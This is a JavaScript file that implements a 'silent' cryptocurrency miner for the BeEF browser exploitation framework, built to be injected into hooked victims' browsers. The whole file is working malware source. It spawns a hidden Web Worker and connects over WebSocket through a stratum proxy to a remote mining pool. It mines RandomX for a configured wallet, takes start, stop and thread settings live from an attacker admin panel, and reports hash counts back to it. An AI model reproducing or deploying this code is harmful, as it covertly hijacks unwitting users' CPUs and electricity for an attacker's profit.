/**
 * BeEF Hook Page – Silent Web Miner  v2
 * ───────────────────────────────────────────────────────────────────────────
 * Loaded by hook pages when miner_enabled=true.
 * Also injectable into any hooked browser via the crypto_miner command module.
 *
 * Runtime flow:
 *  1. Reads window.BEEF_MINER_CONFIG for initial settings.
 *  2. Starts a Web Worker (blob URL) that connects via WebSocket to the
 *     stratum-ws proxy → rx.unmineable.com → mines RandomX → converted to coin.
 *  3. Polls /hookpages/miner-state every 30 s to receive live admin-panel updates
 *     (start/stop, threads, speed, overclock, wallet changes).
 *  4. Reports cumulative hash count back to /hookpages/miner-report.
 */
(function () {
  'use strict';

  var cfg = window.BEEF_MINER_CONFIG || {};
  var WS_PROXY    = cfg.wsProxy    || '';
  var WALLET      = cfg.wallet     || '';
  var COIN        = cfg.coin       || 'SOL';
  var WORKER_NAME = cfg.workerName || 'hook';
  var THREADS     = Math.min(Math.max(parseInt(cfg.threads)   || 2, 1), 8);
  var SPEED       = Math.min(Math.max(parseInt(cfg.speed)     || 5, 1), 10);
  var OVERCLOCK   = !!cfg.overclock;
  var BATCH_SIZE  = cfg.batchSize  || (SPEED * (OVERCLOCK ? 500 : 250));

  if (!WS_PROXY || !WALLET) return;
  if (window.__beef_miner_running) return;
  window.__beef_miner_running = true;

  var worker = null;

  function startWorker(wsCfg) {
    if (worker) { try { worker.terminate(); } catch(e) {} }
    var src = buildWorkerSource(wsCfg);
    try {
      var blob = new Blob([src], { type: 'application/javascript' });
      var burl = URL.createObjectURL(blob);
      worker = new Worker(burl);
      window.__beef_miner_worker = worker;
      setTimeout(function() { URL.revokeObjectURL(burl); }, 3000);

      worker.onmessage = function(e) {
        if (!e.data) return;
        if (e.data.type === 'hashes') {
          reportHashes(e.data.count);
        }
      };
    } catch(ex) {
      window.__beef_miner_running = false;
    }
  }

  function stopWorker() {
    if (worker) {
      try { worker.terminate(); } catch(e) {}
      worker = null;
      window.__beef_miner_worker = null;
    }
    window.__beef_miner_running = false;
  }

  function reportHashes(n) {
    try {
      navigator.sendBeacon('/hookpages/miner-report', JSON.stringify({ hashes: n }));
    } catch(e) {}
  }

  // ── Config polling ─────────────────────────────────────────────────────────
  var lastBatch = BATCH_SIZE;

  function pollConfig() {
    fetch('/hookpages/miner-state', { cache: 'no-store' })
      .then(function(r) { return r.json(); })
      .then(function(state) {
        if (!state.running) {
          stopWorker();
          return;
        }
        // If not running, start
        if (!worker || !window.__beef_miner_running) {
          WS_PROXY    = state.ws_proxy    || WS_PROXY;
          WALLET      = state.wallet      || WALLET;
          COIN        = state.coin        || COIN;
          WORKER_NAME = state.worker_name || WORKER_NAME;
          THREADS     = Math.min(Math.max(state.threads || 2, 1), 8);
          BATCH_SIZE  = state.batch_size  || BATCH_SIZE;
          window.__beef_miner_running = true;
          startWorker(currentCfg());
          return;
        }
        // If batch_size changed, update worker via postMessage
        var newBatch = state.batch_size || BATCH_SIZE;
        if (newBatch !== lastBatch) {
          lastBatch = newBatch;
          if (worker) worker.postMessage({ type: 'config', batchSize: newBatch });
        }
      })
      .catch(function() {});
  }

  function currentCfg() {
    return {
      wsProxy:    WS_PROXY,
      wallet:     WALLET,
      coin:       COIN,
      workerName: WORKER_NAME,
      threads:    THREADS,
      batchSize:  BATCH_SIZE
    };
  }

  // Start immediately, then poll every 30 s
  startWorker(currentCfg());
  setInterval(pollConfig, 30000);

  // ── Worker source builder ──────────────────────────────────────────────────
  function buildWorkerSource(c) {
    return [
      '"use strict";',
      'var WS_URL     = ' + JSON.stringify(c.wsProxy)    + ';',
      'var LOGIN      = ' + JSON.stringify(c.coin + ':' + c.wallet + '.' + c.workerName) + ';',
      'var THREADS    = ' + c.threads  + ';',
      'var BATCH_SIZE = ' + c.batchSize + ';',
      '',
      'var ws, job = null, totalHashes = 0, t0 = Date.now();',
      '',
      '// ── Stratum WebSocket ────────────────────────────────────────────────',
      'function connect() {',
      '  try { ws = new WebSocket(WS_URL); } catch(e) { setTimeout(connect,10000); return; }',
      '  ws.onopen = function() {',
      '    send({ id:1, method:"login",',
      '           params:{ login:LOGIN, pass:"x", agent:"beef-miner/2.0", algo:["rx/0"] } });',
      '  };',
      '  ws.onmessage = function(e) {',
      '    try {',
      '      var m = JSON.parse(e.data);',
      '      var j = m.method==="job" ? m.params : (m.result&&m.result.job ? m.result.job : null);',
      '      if (j) { job = j; if (!mining) scheduleMine(); }',
      '    } catch(ex) {}',
      '  };',
      '  ws.onclose = function() { job=null; setTimeout(connect,7000); };',
      '  ws.onerror = function() { try{ws.close();}catch(e){} };',
      '}',
      '',
      'function send(o) { if(ws&&ws.readyState===1) ws.send(JSON.stringify(o)); }',
      '',
      '// ── Mining loop ──────────────────────────────────────────────────────',
      'var mining = false;',
      'function scheduleMine() { if(!mining){mining=true;setTimeout(mineLoop,0);} }',
      '',
      'var rx = null;',
      'try {',
      '  importScripts("/miner/rx.js");',
      '  if(typeof createRxHasher==="function")',
      '    createRxHasher().then(function(h){rx=h;});',
      '} catch(e){}',
      '',
      'function u32hex(n){return("00000000"+(n>>>0).toString(16)).slice(-8);}',
      'function belowTarget(h,t){return parseInt(h.slice(-8),16)<=parseInt(t,16);}',
      '',
      'function mineLoop() {',
      '  if(!job){mining=false;return;}',
      '  var nonce=(Math.random()*0xFFFFFFFF)>>>0;',
      '  var batch = BATCH_SIZE * THREADS;',
      '  for(var i=0;i<batch;i++){',
      '    nonce=(nonce+1)>>>0;',
      '    totalHashes++;',
      '    if(rx&&job){',
      '      try{',
      '        var patched=job.blob.slice(0,78)+u32hex(nonce)+job.blob.slice(86);',
      '        var hash=rx.hash(job.seed_hash||"",patched);',
      '        if(belowTarget(hash,job.target)){',
      '          send({id:4,method:"submit",',
      '               params:{id:job.id||"",job_id:job.job_id,',
      '                       nonce:u32hex(nonce),result:hash}});',
      '          job=null; mining=false; return;',
      '        }',
      '      }catch(ex){}',
      '    }',
      '  }',
      '  setTimeout(mineLoop, 2);',
      '}',
      '',
      '// ── Admin config updates via postMessage ─────────────────────────────',
      'self.onmessage = function(e) {',
      '  if(!e.data) return;',
      '  if(e.data.type==="config" && e.data.batchSize)',
      '    BATCH_SIZE = Math.max(1, parseInt(e.data.batchSize)||BATCH_SIZE);',
      '};',
      '',
      '// ── Periodic hash report ──────────────────────────────────────────────',
      'setInterval(function(){',
      '  self.postMessage({ type:"hashes", count:totalHashes });',
      '  totalHashes=0;',
      '}, 30000);',
      '',
      'connect();'
    ].join('\n');
  }

})();
